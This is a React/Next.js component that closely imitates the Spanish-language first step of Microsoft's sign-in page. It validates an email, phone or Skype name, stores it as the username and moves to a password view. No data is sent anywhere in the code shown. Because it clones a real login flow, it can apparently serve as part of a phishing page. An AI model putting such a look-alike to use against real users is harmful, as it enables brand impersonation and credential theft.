"use client";
import Link from "next/link";
import { FormContext, IFormStatus } from "./FormMicrosoft";
import React, { useContext, useState } from "react";
import styles from "./styles/template.module.css";

function ErrorBox() {
  return (
    <div className={styles["form-error-text"]}>
      Escribe una dirección de correo electrónico, un número de teléfono o un
      nombre de Skype válidos.
    </div>
  );
}

function checkError(data: string): boolean {
  const email = new RegExp(
    /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
  ).test(data);
  const phone = new RegExp(
    /^(\+\d{1,2}\s?)?1?\-?\.?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$/
  ).test(data);
  const user = new RegExp(/^[a-zA-Z0-9]{5,31}$/).test(data);
  return email || phone || user;
}

export default function EmailForm() {
  const [haveError, setError] = useState(false);
  const formContext = useContext(FormContext);

  function handleSubmit() {
    const emailElement = document.getElementById(
      "email-field"
    ) as HTMLInputElement;
    const email = emailElement.value;
    const correct = checkError(email);

    setError(!correct);

    if (correct) {
      if (formContext) {
        formContext.setFormStatus((prevState: IFormStatus) => {
          return {
            ...prevState,
            username: email,
            view: "password",
          };
        });
      }
    }
  }

  function handleInput(event: React.FormEvent<HTMLInputElement>) {
    const input = event.target as HTMLInputElement;
    input.value ? setError(false) : setError(true);
  }

  return (
    <div className="flex flex-col gap-3">
      <h1 className={styles["form-title"]}>Iniciar sesión</h1>
      {haveError ? <ErrorBox /> : null}
      <form onSubmit={(e) => e.preventDefault()}>
        <input
          id="email-field"
          className={`${styles["form-inputPrimary"]} ${haveError && styles["form-error"]}`}
          type="text"
          aria-required="true"
          onInput={handleInput}
          onKeyUp={(event) => {
            if (event.key === "Enter" || event.keyCode === 13) {
              handleSubmit();
            }
          }}
          autoComplete="username"
          maxLength={113}
          name="email"
          placeholder="Correo electrónico, teléfono o Skype"
        />
        <div className="flex flex-col gap-4 text-[13px]">
          <p>
            ¿No tiene una cuenta?{" "}
            <Link className={styles["form-linkPrimary"]} href="#">
              Cree una.
            </Link>
          </p>
          <div>
            <Link className={styles["form-linkPrimary"]} href="#">
              ¿No puede acceder a su cuenta?
            </Link>
          </div>
        </div>
        <div className={styles["form-btnContainer"]}>
          <button
            type="button"
            onClick={handleSubmit}
            className={styles["form-btnPrimary"]}
          >
            Siguiente
          </button>
        </div>
      </form>
    </div>
  );
}
